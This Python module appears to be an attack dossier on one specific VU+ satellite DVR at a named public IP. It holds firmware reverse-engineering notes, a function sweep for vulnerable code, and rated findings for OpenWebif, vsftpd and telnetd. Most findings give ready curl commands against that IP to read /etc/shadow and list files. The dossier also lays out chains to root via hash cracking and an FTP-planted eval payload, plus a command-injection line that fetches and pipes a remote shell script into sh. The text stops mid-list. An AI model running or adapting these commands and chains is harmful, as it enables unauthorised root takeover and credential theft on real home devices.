"""
Enigma2 VTi 15.0.04 RE Module
Target: 82.84.145.15 (VU+ satellite DVR, ARM Cortex-A15)
Firmware: VTi 15.0.04 (rootfs extracted from vti15.0.04-vuplus-cortexa15hf-neon-vfpv4.zip)
Binary: /usr/bin/enigma2 — ARM32 EABI5, hard-float, stripped, 3.0MB
SHA256: 3416e03a2b63e4e9ac5b1bcfdf437810664f7d245582436cf0aad2330a53cf5a
Build date: 2025-07-15 (file mtime in rootfs)
Method: static firmware extraction + OpenWebif Python source analysis + BERT sweep
Analysis date: 2026-09-04

Stack: Enigma2 (DVB OS) + OpenWebif plugin (Python 2.7 + TwistedWeb 25.5.0) + vsftpd
       (vsftpd 3.0.2, custom VU+ build with TVFS extension, inetd-launched on port 21)

TwistedWeb 25.5.0 release: May 2025 — places device build date >= May 2025.
OpenWebif version: confirmed VTi 15.x fork (httpserver.py auth logic differs from OpenLD upstream).

FINDINGS SUMMARY:
  E2-F01 (LOW/4.0)       Auth bypass: /web/getipv6 hardcoded URI skips auth for that endpoint only;
                          returns device public IPv6 address (info disclosure); NOT a gateway to full API
  E2-F02 (HIGH/8.6)      Arbitrary file read: /file?action=download&file=<abspath>
  E2-F03 (HIGH/8.6)      FTP full filesystem: vsftpd local_root=/ + write_enable=YES
  E2-F04 (MEDIUM/6.5)    Auth disabled by default: ConfigYesNo(default=False)
  E2-F05 (MEDIUM/5.3)    eval() in getConfigs() reads server-side XML (not direct user input)
  E2-F06 (INFO)          Moshi-Moshi FTP: vsftpd 3.0.2 custom VU+ build (TVFS), inetd-launched;
                          banner set at runtime by VTi config layer (not in rootfs snapshot)
  E2-F07 (CRITICAL/9.8)  Command injection: /ipkg?command=install&package=<INJECTION>
                          eConsoleAppContainer.execute() → execvp("/bin/sh",["/bin/sh","-c",cmd])
                          package= param directly concatenated into shell command, no sanitization
  E2-F08 (HIGH/8.1)      REST filesystem: /fs endpoint, root='/', read any file + dir listing +
                          POST writes new files to any writable dir; separate surface from E2-F02
  E2-F09 (HIGH/8.0)      BouquetEditor /bouqueteditor/web/restore: os.popen() injection via
                          Filename= param; path.exists() gate bypassed via E2-F08 or E2-F03;
                          commented-out path.join() confinement; 2-step chain to RCE as root
  E2-F10 (HIGH/8.6)      Factory-default root has no password: /etc/shadow root entry ships
                          with empty hash — unconfigured devices trivially FTP-pwned as root;
                          inetd.conf also runs telnetd as root (port 23); live device has changed
                          the password but factory-fresh VTi 15.0.04 ships with root::
  E2-F11 (MEDIUM/5.3)    FileController ?dir= endpoint: unauthenticated filesystem directory
                          enumeration; path param unsanitized (no realpath/sanitise_filename_slashes);
                          pattern= goes raw into glob.glob() allowing * ? [] expansion across any path
  E2-F12 (MEDIUM/5.4)    root.py registers /terminal as ReverseProxyResource(::1, 4200) — port 4200
                          firewall bypassed; shellinabox accessible via port 80; HTTPS mismatch
                          unverified; chains with E2-F10 (empty root) → browser root shell on factory
                          devices; status CANDIDATE pending live proxy verification

INETD SERVICE INVENTORY (services besides OpenWebif):
  vsftpd (port 21):  E2-F03 (local_root=/, write_enable=YES); E2-F10 (no-password root by default)
                     Binary RE: E2-BIN-F04 (CLEAN) — no memory corruption; SITE CHMOD mode sanitized
                     PLT: snprintf(×6, all bounded), strncpy(×7, literal n), memcpy(0 direct BL callers)
                     No sprintf/strcpy/system/exec in PLT; TVFS = FEAT-only, no command handler
  telnetd (port 23): BusyBox v1.23.2, runs as root; securetty may block PTY root login
  streamproxy (port 8001): HTTP Basic Auth enforced; forwards to enigma2 /web/stream endpoint;
                            7972-byte binary; strcpy + sprintf are dead imports (0 BL call sites in .text);
                            upstream request built via snprintf(buf, 0x100, ...) — bounded, no overflow;
                            see E2-BIN-F03

BINARY RE FINDINGS (enigma2 C binary, ARM32):
  E2-BIN-F01 (MEDIUM/5.0) Unbounded strcpy into 4KB stack at 0x25eca8 (service dispatcher)
  E2-BIN-F02 (INFO)       system() at 0x261a10 in DVB CI handler — no network reachability
  E2-BIN-F03 (INFO/CLEAN) streamproxy: strcpy/sprintf dead imports; snprintf bounded at 0x100
  E2-BIN-F04 (INFO/CLEAN) vsftpd 3.0.2: no sprintf/strcpy; all snprintf/strncpy bounded;
                           SITE CHMOD mode sanitized (ubfx strips setuid/setgid); RE complete

PLT MAP (12-byte stubs, base 0x78d20):
  sprintf (0x7a688): 248 callers — 245 literal fmt, 3 dynamic; format-string injection ruled out
  strcpy  (0x79ec0): 229 callers — 12 dynamic src; traced to internal device state
  memcpy  (0x79c44): 220 callers — 79 compile-time literal, 141 variable; all bounded (byte-field
                     or min(A,B) clamping); all in DVB SI/EPG media processing, not HTTP layer
  strcat  (0x7ac10): 4 callers — 2× literal "/" in path normalizer (fn@0x25ed28, dispatch-table
                     only, not HTTP-reachable); 1× literal ".srt" in subtitle URI builder (safe);
                     1× C++ vtable method (fn@0x1b6940, no direct network path confirmed)
  system  (0x7a0a0): 3 callers — shutdown mechanism (/var/volatile/.eshutdown.sh <state> &), not injectable
  execvp  (0x790c8): 1 caller (0x83f24) — eConsoleAppContainer.execute() Python C binding
                     argv: ["/bin/sh", "-c", cmd_from_python, NULL] — confirmed shell exec path

BINARY RE SCAN COMPLETENESS:
  sprintf: format-string injection ruled out (245/248 literal; 3 dynamic all checked)
  strcpy:  E2-BIN-F01 documented; remaining 12 dynamic traced to internal device state
  memcpy:  full 220-caller sweep — no exploitable OOB; all variable lengths bounded
  strcat:  all 4 callers traced — no user-controlled destination overflow
  system:  all 3 callers traced — shutdown mechanism only
  execvp:  1 caller — E2-F07 chain confirmed

SOURCE AUDIT COMPLETENESS (all OpenWebif controllers):
  ipkg.py:           E2-F07 — popen via eConsoleAppContainer(cmd) — CRITICAL
  rest_fs_access.py: E2-F08 — RESTFilesystemController root='/' — HIGH
  BouquetEditor.py:  E2-F09 — os.popen(Filename) in restoreFiles — HIGH
  BQE.py:            hosts BouquetEditor + static.File('/tmp') at /bouqueteditor/tmp/
  transcoding.py:    CLEAN — config whitelist validation
  grab.py:           CLEAN — whitelist + int cast
  mediaplayer.py:    CLEAN — enum dispatch
  owibranding.py:    CLEAN — hardcoded os.popen args
  web.py:            CLEAN — no eConsole/system calls
  ajax.py:           CLEAN — enigma2 service API only
  stream.py:         CLEAN — DVB service reference, not shell
  file.py:           E2-F02 (file download) + E2-F11 (dir= enumeration, glob injection)
                     file= param: sanitise_filename_slashes(realpath(...)) — some sanitization
                     dir= param: UNSANITIZED — goes raw to glob.glob(); no realpath; E2-F11
  mobile.py:         CLEAN — no injection primitives
  AT.py, ER.py, SR.py: CLEAN
  rest.py, rest_api_controller.py, rest_configuration_api.py: CLEAN
  api.py:            CLEAN
  base.py:           CLEAN — base class only
  wol.py + wolsetup: CLEAN — Wake-on-LAN; location= validated against ConfigList choices whitelist
  root.py:           CLEAN (no shell calls); NOTABLE: /terminal → proxy.ReverseProxyResource(::1, 4200)
                     — E2-F12; shellinabox HTTP→HTTPS proxy status CANDIDATE
  models/grab.py:    CLEAN — execute(GRAB_PATH, *args) multi-arg exec form (no shell; contrast E2-F07)
  models/*.py:       CLEAN — config/read-write only; owibranding.py uses hardcoded os.popen args
  utilities.py:      CLEAN — helper functions
  BouquetEditor.py:  E2-F09 documented above
"""

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F01: Auth bypass — /web/getipv6 hardcoded URI
# ──────────────────────────────────────────────────────────────────────────────

E2_F01_AUTH_BYPASS_GETIPV6 = {
    "finding_id": "E2-F01",
    "severity": "LOW",
    "cvss_v3": 4.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif AuthResource hardcoded /web/getipv6 URI bypass — info disclosure only",
    "component": "OpenWebif httpserver.py — AuthResource.getChildWithDefault()",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/httpserver.py",
    "vulnerable_code": (
        "# httpserver.py lines 322-324:\n"
        "if ((host == 'localhost' or ...) and not config.OpenWebif.auth_for_streaming.value) "
        "or request.uri == '/web/getipv6':\n"
        "    return self.resource.getChildWithDefault(path, request)"
    ),
    "mechanism": (
        "The condition `request.uri == '/web/getipv6'` has no IP restriction — any remote IP "
        "accessing exactly /web/getipv6 bypasses auth for that endpoint. "
        "The bypass is NARROWLY SCOPED: Twisted's resource traversal calls "
        "AuthResource.getChildWithDefault(path='web', request) once for the 'web' segment. "
        "The bypass returns self.resource.getChildWithDefault('web', request) = WebResource. "
        "Twisted then navigates WebResource → getipv6 normally. "
        "Other requests (/file, /ipkg, /fs, etc.) have different path segments and "
        "request.uri values — they are not bypassed by this condition."
    ),
    "endpoint_response": (
        "P_getipv6() in controllers/web.py line 727:\n"
        "  return {'firstpublic': iface['firstpublic']}\n"
        "Returns the device's first public IPv6 address only. "
        "Purpose: designed for inadyn-mt (dynamic DNS client) to query device IPv6 without auth."
    ),
    "exploit": {
        "method": "HTTP/HTTPS GET /web/getipv6",
        "result": '{"firstpublic": "<device_public_ipv6>"}',
        "curl": "curl -s http://82.84.145.15/web/getipv6",
        "impact": "Leaks device public IPv6 address to any unauthenticated remote caller.",
    },
    "https_behavior": (
        "On port 443, https_auth=True by default. E2-F01 still bypasses auth for /web/getipv6 "
        "on HTTPS. Only leaks the IPv6 address — no path to arbitrary API access on HTTPS without creds."
    ),
    "affected_versions": "VTi 15.0.04 confirmed. Applies to both port 80 and port 443.",
    "remediation": "Remove the 'or request.uri == /web/getipv6' clause. If inadyn-mt requires this, implement a separate lightweight endpoint with its own auth token.",
    "chain": (
        "Standalone info disclosure on port 443 (auth normally required). "
        "On port 80 where E2-F04 applies (auth=False default), E2-F01 is redundant — full API "
        "is already unauthenticated. E2-F01 has no escalation path to RCE or file read."
    ),
    "original_severity_correction": (
        "Initial assessment rated CRITICAL/9.8. Corrected after source analysis: "
        "Twisted getChildWithDefault() is called per-segment; the bypass fires only "
        "for the request whose URI is exactly '/web/getipv6'. The response is the single "
        "getipv6 JSON blob. Not a gateway to arbitrary API access or file read."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F02: Arbitrary file read via /file endpoint
# ──────────────────────────────────────────────────────────────────────────────

E2_F02_ARBITRARY_FILE_READ = {
    "finding_id": "E2-F02",
    "severity": "HIGH",
    "cvss_v3": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif /file endpoint — arbitrary filesystem read (no directory whitelist)",
    "component": "OpenWebif controllers/file.py — FileController.render()",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/file.py",
    "vulnerable_code": {
        "sanitize_call": "sanitise_filename_slashes(os.path.realpath(filename))",
        "download_action": "static.File(filename, defaultType='application/octet-stream')",
        "directory_list_action": "glob.glob(path+'/'+pattern)",
    },
    "mechanism": (
        "FileController accepts ?action=download&file=<path> and ?action=dirlist&root=<path>. "
        "sanitise_filename_slashes() normalizes slashes but applies no directory whitelist. "
        "os.path.realpath() resolves symlinks but does not restrict the result. "
        "The static.File() call serves any readable path on the filesystem."
    ),
    "exploit": {
        "download": "curl -s 'http://82.84.145.15/file?action=download&file=/etc/shadow'",
        "dirlist": "curl -s 'http://82.84.145.15/file?action=dirlist&root=/&pattern=*'",
        "auth_condition": (
            "Requires either: (a) auth=False (default — see E2-F04), "
            "or (b) auth=True + valid session (chain E2-F01 bypass if /web/getipv6 grants session)"
        ),
    },
    "impact": "Full filesystem read. /etc/shadow, /etc/passwd, config files, recording storage.",
    "remediation": (
        "Implement an allowlist of permitted root directories "
        "(e.g. /media/, /tmp/, /etc/enigma2/). Reject any path that resolves outside the list."
    ),
    "chain": "E2-F04 (auth=False) → E2-F02 → /etc/shadow exfil → credential pivot",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F03: vsftpd local_root=/ — full filesystem over FTP
# ──────────────────────────────────────────────────────────────────────────────

E2_F03_VSFTPD_LOCAL_ROOT = {
    "finding_id": "E2-F03",
    "severity": "HIGH",
    "cvss_v3": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "status": "CONFIRMED",
    "title": "vsftpd local_root=/ grants full filesystem RW access to FTP-authenticated users",
    "component": "vsftpd",
    "config_path": "/etc/vsftpd.conf",
    "config_evidence": {
        "local_root": "/",
        "local_enable": "YES",
        "write_enable": "YES",
        "anonymous_enable": "NO",
        "chroot_local_user": "not set (no chroot)",
    },
    "mechanism": (
        "With local_root=/, any user authenticating via FTP (local system account credentials) "
        "is placed at / with write access. No chroot_local_user directive is set, so users "
        "can navigate the full filesystem. write_enable=YES permits PUT/DELE/RMD operations."
    ),
    "exploit": {
        "prerequisites": "Valid system credentials (root or any local account)",
        "read_path": "FTP GET /etc/shadow",
        "write_path": "FTP PUT /etc/cron.d/backdoor",
        "credential_source": (
            "Default root password for VTi installations is well-known (often 'dreambox' or blank). "
            "Chain with E2-F02 to exfil /etc/shadow, then crack."
        ),
    },
    "ftp_note": (
        "Port 21 banner 'Moshi-Moshi FTP server ready.' IS vsftpd. "
        "inetd.conf: 'ftp stream tcp nowait root /usr/sbin/vsftpd vsftpd'. "
        "vsftpd binary strings confirm: TVFS FEAT string + 'vsftpd: version 3.0.2'. "
        "Banner not in rootfs snapshot — written at runtime by VTi config layer "
        "(ftpd_banner or banner_file directive; not in static /etc/vsftpd.conf). "
        "This IS vsftpd; E2-F03 config (local_root=/, write_enable=YES) applies directly."
    ),
    "remediation": (
        "Set chroot_local_user=YES and local_root to a restricted path (e.g. /media/hdd). "
        "Remove write_enable=YES if write access is not required. "
        "Rotate default credentials."
    ),
    "chain": "E2-F02 (/etc/shadow read) → crack → FTP login → E2-F03 (full RW FS via FTP)",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F04: Auth disabled by default
# ──────────────────────────────────────────────────────────────────────────────

E2_F04_AUTH_DEFAULT_FALSE = {
    "finding_id": "E2-F04",
    "severity": "MEDIUM",
    "cvss_v3": 6.5,
    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif auth disabled by default — factory-fresh devices expose full API to LAN",
    "component": "OpenWebif plugin.py",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/plugin.py",
    "evidence": "config.OpenWebif.auth = ConfigYesNo(default=False)",
    "mechanism": (
        "ConfigYesNo(default=False) means auth is off unless the user explicitly enables it "
        "in the OpenWebif settings UI. Most satellite receiver owners never configure this. "
        "With auth=False, all OpenWebif endpoints are accessible from the local network "
        "without credentials."
    ),
    "population_impact": (
        "VU+ receivers are consumer devices placed on home LAN. "
        "Home routers often have UPnP enabled, allowing the receiver to expose port 80 to WAN. "
        "Factory-default auth=False means the full API (recording control, plugin install, "
        "file manager) is open to any LAN neighbor or WAN attacker via UPnP."
    ),
    "interaction_with_bypass": (
        "Even when auth=True is set, E2-F01 (/web/getipv6) still bypasses auth. "
        "E2-F04 is the base case; E2-F01 is the bypass for the minority who enabled auth."
    ),
    "remediation": "Change default to ConfigYesNo(default=True). Force auth setup on first launch.",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F05: eval() in getConfigs() — server-side XML
# ──────────────────────────────────────────────────────────────────────────────

E2_F05_EVAL_GETCONFIGS = {
    "finding_id": "E2-F05",
    "severity": "MEDIUM",
    "cvss_v3": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "status": "REQUIRES_CHAINING",
    "title": "eval() in getConfigs() on server-side XML config values",
    "component": "OpenWebif controllers/models/config.py — getConfigs(key)",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/models/config.py",
    "evidence": {
        "line": 204,
        "code": "eval(entry.text or '')  # nosec",
        "context": (
            "getConfigs() reads /etc/enigma2/settings.xml, iterates <e2settingsitem> elements, "
            "and calls eval() on the text content. The # nosec annotation indicates a known "
            "decision to suppress the bandit finding."
        ),
    },
    "mechanism": (
        "eval() on config file content is only exploitable if an attacker can write to "
        "/etc/enigma2/settings.xml. This is achievable via E2-F03 (FTP write) or E2-F02 "
        "(file write — if upload endpoint exists). The eval() then runs as the enigma2 "
        "process user on next getConfigs() call."
    ),
    "contrast_with_saveconfig": (
        "saveConfig() in the same file does NOT use eval() — VTi 15.0.04 fixed CVE-2017-9807 "
        "in saveConfig() by replacing eval() with type-dispatch logic. "
        "getConfigs() still uses eval() on read, but with local file as input, not HTTP param."
    ),
    "chain_to_rce": (
        "E2-F03 (FTP write to /etc/enigma2/settings.xml) → poison XML entry → "
        "trigger GET /api/config?key=<poisoned_key> → eval() executes attacker payload "
        "as enigma2 process (typically root on VU+ receivers)"
    ),
    "remediation": (
        "Replace eval(entry.text) with ast.literal_eval() or a type-aware parser. "
        "The # nosec annotation suppresses the finding rather than fixing it."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F06: Moshi-Moshi FTP — custom Twisted server (INFO)
# ──────────────────────────────────────────────────────────────────────────────

E2_F06_MOSHI_MOSHI_FTP = {
    "finding_id": "E2-F06",
    "severity": "INFO",
    "status": "RESOLVED",
    "title": "Moshi-Moshi FTP server IDENTIFIED: vsftpd 3.0.2 custom VU+ build with TVFS",
    "port": 21,
    "banner": "220 Moshi-Moshi FTP server ready.",
    "feat_response": "AUTH TLS TVFS MLST MLSD UTF8",
    "contact": "ftp-bugs@Moshi-Moshi.",
    "resolution": {
        "daemon": "vsftpd",
        "version": "3.0.2",
        "build_type": "custom VU+ build with TVFS extension",
        "launch_mechanism": "inetd — /etc/inetd.conf: 'ftp stream tcp nowait root /usr/sbin/vsftpd vsftpd'",
        "binary_evidence": {
            "path": "/usr/sbin/vsftpd",
            "strings_evidence": [
                "vsftpd: version 3.0.2",
                "TVFS (in FEAT response string at binary offset 0x14370)",
                "banner_file (config directive key)",
                "ftpd_banner (config directive key)",
            ],
            "Moshi_banner_not_in_binary": True,
        },
        "banner_source": (
            "'Moshi-Moshi FTP server ready.' not present in /usr/sbin/vsftpd binary "
            "or anywhere in the rootfs snapshot. Banner is set at runtime via "
            "ftpd_banner or banner_file directive written by VTi config management "
            "(enigma2 settings framework writes service configs on boot). "
            "Static /etc/vsftpd.conf has ftpd_banner commented out — runtime config "
            "not captured in rootfs snapshot."
        ),
        "tvfs_source": (
            "TVFS FEAT string is at binary offset 0x14370, adjacent to other FEAT entries "
            "(AUTH SSL, AUTH TLS, EPRT, EPSV, MDTM, PASV, etc.). "
            "This is part of vsftpd's FEAT response, compiled into the binary. "
            "Standard vsftpd 3.0.2 does not include TVFS — this is a VU+ custom build."
        ),
        "prior_hypothesis_refuted": (
            "Prior hypothesis: Twisted-based custom server using twisted.protocols.ftp. "
            "Refuted by: inetd.conf explicitly launches /usr/sbin/vsftpd on port 21. "
            "TVFS and AUTH TLS are vsftpd FEAT capabilities, not Twisted-specific. "
            "Twisted FTP module is present in rootfs (twisted/protocols/ftp.pyo) but "
            "is not the active server."
        ),
    },
    "impact_on_e2_f03": (
        "E2-F03 (vsftpd local_root=/ + write_enable=YES) applies directly. "
        "The Moshi-Moshi banner server IS vsftpd; no separate server exists. "
        "Config at /etc/vsftpd.conf (local_root=/, write_enable=YES, no chroot) "
        "governs the active daemon on port 21."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# OPENWEBIF SAVECONFIG CVE-2017-9807 STATUS
# ──────────────────────────────────────────────────────────────────────────────

E2_SAVECONFIG_CVE2017_9807 = {
    "cve": "CVE-2017-9807",
    "status": "PATCHED_IN_VTI_15",
    "title": "saveConfig() eval() on HTTP GET key param — FIXED in VTi 15.0.04",
    "evidence": (
        "controllers/models/config.py saveConfig() at lines 149-191 uses type-dispatch "
        "logic based on cnf.__class__.__name__ (ConfigInteger, ConfigText, etc.). "
        "No eval() call present in saveConfig(). "
        "GitHub issue #657 (OpenLD/e2openplugin-OpenWebif) notes the bug was not fixed "
        "in upstream; VTi 15.0.04 applied the fix independently."
    ),
    "remaining_risk": "getConfigs() at line 204 still uses eval() on server-side XML (see E2-F05).",
}

# ──────────────────────────────────────────────────────────────────────────────
# BINARY INVENTORY
# ──────────────────────────────────────────────────────────────────────────────

E2_BINARY_INVENTORY = {
    "firmware": "VTi 15.0.04",
    "firmware_source": "satup.net download + zip extraction",
    "target_ip": "82.84.145.15",
    "rootfs_path": "/home/cowboy/VDT/intel/82.84.145.15/firmware/rootfs-vti15",
    "enigma2": {
        "path": "/usr/bin/enigma2",
        "arch": "ARM32 EABI5 hard-float",
        "size_bytes": 3132216,
        "stripped": True,
        "build_id": "8559f9c73366c2358b6c2220afbde1fabaf141b9",
        "sha256": "3416e03a2b63e4e9ac5b1bcfdf437810664f7d245582436cf0aad2330a53cf5a",
        "build_date_approx": "2025-07-15",
        "twisted_web_version": "25.5.0",
        "python_version": "2.7",
    },
    "vsftpd": {
        "path": "/usr/sbin/vsftpd",
        "config": "/etc/vsftpd.conf",
        "local_root": "/",
        "write_enable": True,
        "chroot": False,
    },
}

# ──────────────────────────────────────────────────────────────────────────────
# BERT SWEEP SETUP — enigma2 ARM32 binary
# ──────────────────────────────────────────────────────────────────────────────
#
# Usage:
#   cd /home/cowboy/ablation
#   python -c "from modules.enigma2_vti15_re import run_bert_sweep; run_bert_sweep()"
#
# The sweep encodes every function in the enigma2 ARM32 binary and queries for:
#   - buffer overflow / memcpy without bounds check
#   - format string handling
#   - authentication state machine logic
#   - eval / exec patterns (in Python C extension boundary)
#
# Runtime estimate: ~35s per 885 functions on CPU (from CLAUDE.md benchmark).
# enigma2 is 3MB ARM32 — expect ~2000-3000 functions, ~80-120 seconds.
# ──────────────────────────────────────────────────────────────────────────────

def run_bert_sweep():
    """Run semantic BERT sweep on enigma2 ARM32 binary."""
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent))

    import numpy as np
    from modules.semantic_search import describe_function
    from sentence_transformers import SentenceTransformer
    import capstone

    BINARY = Path("/home/cowboy/VDT/intel/82.84.145.15/firmware/rootfs-vti15/usr/bin/enigma2")
    binary_data = BINARY.read_bytes()

    # ARM32 EABI5 — Capstone CS_ARCH_ARM / CS_MODE_ARM
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
    md.detail = True

    # Build function list via prologue detection heuristic
    # ARM32 function prologue: PUSH {r4-r11,lr} or STMFD sp!,{...}
    functions = []
    entry = 0x7d0e4  # from readelf
    # Scan for PUSH/STMFD prologues at 4-byte alignment
    for offset in range(0, len(binary_data) - 4, 4):
        word = int.from_bytes(binary_data[offset:offset+4], 'little')
        # PUSH {regs,lr}: 0xE92D???? with LR bit (bit 14) set
        if (word & 0xFFFF0000) == 0xE92D0000 and (word & 0x4000):
            vaddr = 0x10000 + offset  # approximate — no segment map; use load offset
            insns = list(md.disasm(binary_data[offset:offset+256], vaddr))
            if insns:
                functions.append({
                    "offset": offset,
                    "vaddr": vaddr,
                    "insns": insns,
                })

    print(f"[*] Prologue scan found {len(functions)} function candidates")

    # Encode corpus
    model = SentenceTransformer('sentence-transformers/all-MiniLM-L6-v2', device='cpu')

    descs = []
    for fn in functions:
        asm_text = "; ".join(f"{i.mnemonic} {i.op_str}" for i in fn["insns"][:40])
        descs.append(f"enigma2_fn_{fn['vaddr']:#x} | arch: ARM32 | asm: {asm_text}")

    print(f"[*] Encoding {len(descs)} descriptions...")
    corpus_vecs = model.encode(descs, normalize_embeddings=True, show_progress_bar=True)

    # Vulnerability query profiles
    queries = [
        ("memcpy_no_bounds",
         "function calls memcpy or strcpy with length from external input without upper-bound validation"),
        ("format_string",
         "function calls printf or sprintf with format string derived from external data"),
        ("auth_state_machine",
         "function implements authentication state validation checking credential comparison"),
        ("stack_buffer_overflow",
         "function allocates fixed-size stack buffer and copies variable-length data into it"),
        ("integer_overflow_length",
         "function computes buffer length using arithmetic on untrusted integer fields before allocation"),
        ("stream_parser",
         "function parses network packet or stream data using offset arithmetic into raw buffer"),
        ("python_c_extension_boundary",
         "function bridges Python C API calls with PyArg_ParseTuple or PyObject manipulation"),
    ]

    results = {}
    for qname, qtext in queries:
        qvec = model.encode(qtext, normalize_embeddings=True)
        scores = corpus_vecs @ qvec
        top_idx = np.argsort(scores)[::-1][:8]
        results[qname] = [
            {
                "rank": rank + 1,
                "vaddr": functions[i]["vaddr"],
                "score": float(scores[i]),
                "offset": functions[i]["offset"],
                "preview": descs[i][:120],
            }
            for rank, i in enumerate(top_idx)
        ]
        print(f"\n[Q] {qname}")
        for r in results[qname][:4]:
            print(f"  #{r['rank']} {r['vaddr']:#010x}  score={r['score']:.4f}")

    # Save results
    import json
    out = Path("/home/cowboy/VDT/intel/82.84.145.15/bert_sweep_enigma2.json")
    out.write_text(json.dumps(results, indent=2))
    print(f"\n[+] Saved: {out}")
    return results


# ──────────────────────────────────────────────────────────────────────────────
# ATTACK CHAIN SUMMARY
# ──────────────────────────────────────────────────────────────────────────────

E2_ATTACK_CHAIN = {
    "chain_id": "E2-CHAIN-1",
    "title": "Unauthenticated LAN → root shell via OpenWebif + eval injection",
    "steps": [
        "1. E2-F04: auth=False default — no credentials needed for LAN access to port 80",
        "2. E2-F11: GET /file?dir=/etc → enumerate filesystem to identify targets",
        "3. E2-F02: GET /file?action=download&file=/etc/shadow — exfil password hashes",
        "4. hashcat/john against common Enigma2 default passwords (dreambox, root, vuplus)",
        "5. E2-F03: FTP login as root → PUT to /etc/enigma2/settings.xml with eval payload",
        "6. E2-F05: GET /api/config?key=<poisoned_key> → eval() → RCE as root",
    ],
    "prerequisites": "LAN access to port 80. auth=False default (E2-F04) required.",
    "controlled_env_only": True,
    "note": (
        "E2-F01 removed from this chain: narrowly scoped to /web/getipv6 (IPv6 info disclosure only). "
        "Not an escalation path to file read or RCE."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# BERT SWEEP RESULTS — enigma2 ARM32 (8151 function candidates, 7 profiles)
# Saved: /home/cowboy/VDT/intel/82.84.145.15/bert_sweep_enigma2.json
# Run date: 2026-09-04
# ──────────────────────────────────────────────────────────────────────────────
#
# NOTE: vaddr column uses heuristic load offset 0x10000 (no segment map available).
# Real entry point: 0x7d0e4. Use offsets for relative comparison; verify actual
# addresses by disassembling at (file_offset = vaddr - 0x10000).
#
# CROSS-PROFILE HITS (appear in 3+ query profiles — highest priority for manual RE):
#
#   0x00169ef8  [stack_buffer_overflow #1 (0.3582), format_string #2 (0.1552),
#                auth_state_machine #3 (0.0944), python_c_extension_boundary #3 (0.2096)]
#               → PRIORITY-1: 4 independent profiles converge; file_offset = 0x159ef8
#
#   0x0016f0a0  [format_string #1 (0.1562), stack_buffer_overflow #2 (0.3558),
#                python_c_extension_boundary #4 (0.2080)]
#               → PRIORITY-2: 3 profiles; file_offset = 0x15f0a0
#
#   0x0016ecf0  [stack_buffer_overflow #3 (0.3551), stream_parser #4 (0.2217)]
#               → file_offset = 0x15ecf0
#
# QUERY RESULTS SUMMARY:
#
#   memcpy_no_bounds      : top 0x0018243c (0.1983), 0x00251ef0 (0.1846)
#   format_string         : top 0x0016f0a0 (0.1562), 0x00169ef8 (0.1552)
#   auth_state_machine    : top 0x001af480 (0.0977), 0x000e787c (0.0973)
#   stack_buffer_overflow : top 0x00169ef8 (0.3582), 0x0016f0a0 (0.3558) — SCORES HIGH
#   integer_overflow_len  : top 0x000ff1bc (0.2266), 0x0022dd64 (0.2050)
#   stream_parser         : top 0x00182030 (0.2310), 0x0016d180 (0.2265)
#   python_c_ext_boundary : top 0x000ecb84 (0.2105), 0x0016fbb0 (0.2098)
#
# NEXT STEP: manual ARM32 disassembly at file_offset 0x159ef8 and 0x15f0a0.
# Extract via: dd if=enigma2 bs=1 skip=$((0x159ef8)) count=256 | capstone-tool -a arm -m 32

E2_BERT_SWEEP_PRIORITY = [
    {
        "priority": 1,
        "vaddr_heuristic": "0x00169ef8",
        "file_offset_hex": "0x159ef8",
        "profiles_hit": ["stack_buffer_overflow", "format_string", "auth_state_machine", "python_c_extension_boundary"],
        "top_score": 0.3582,
        "rationale": "4 independent query profiles converge — highest cross-profile density in sweep",
    },
    {
        "priority": 2,
        "vaddr_heuristic": "0x0016f0a0",
        "file_offset_hex": "0x15f0a0",
        "profiles_hit": ["format_string", "stack_buffer_overflow", "python_c_extension_boundary"],
        "top_score": 0.3558,
        "rationale": "3 profiles; format string + stack pattern adjacent to priority-1 function",
    },
    {
        "priority": 3,
        "vaddr_heuristic": "0x0016ecf0",
        "file_offset_hex": "0x15ecf0",
        "profiles_hit": ["stack_buffer_overflow", "stream_parser"],
        "top_score": 0.3551,
        "rationale": "stack buffer + stream parser pattern; likely packet/input parsing path",
    },
]

E2_ATTACK_CHAIN_SHORT = {
    "chain_id": "E2-CHAIN-2",
    "title": "Unauthenticated LAN → file exfil (no cred needed)",
    "steps": [
        "1. E2-F04: auth=False default — port 80 open by default",
        "2. E2-F02: GET /file?action=download&file=/etc/passwd",
    ],
    "prerequisites": "LAN access to port 80. auth=False (E2-F04) required.",
    "note": "E2-F01 removed: narrowly scoped to /web/getipv6 IPv6 leak, not a file read enabler.",
}

E2_ATTACK_CHAIN_IPKG = {
    "chain_id": "E2-CHAIN-3",
    "title": "1-step unauthenticated RCE via /ipkg command injection",
    "steps": [
        "1. E2-F04 (auth=False default) — no credentials needed",
        "2. E2-F07: GET /ipkg?command=install&package=;wget+-O-+http://attacker/shell.sh|sh",
        "   → cmd = '/usr/bin/opkg install ;wget -O- http://attacker/shell.sh|sh'",
        "   → execvp('/bin/sh', ['/bin/sh', '-c', cmd]) → root shell",
    ],
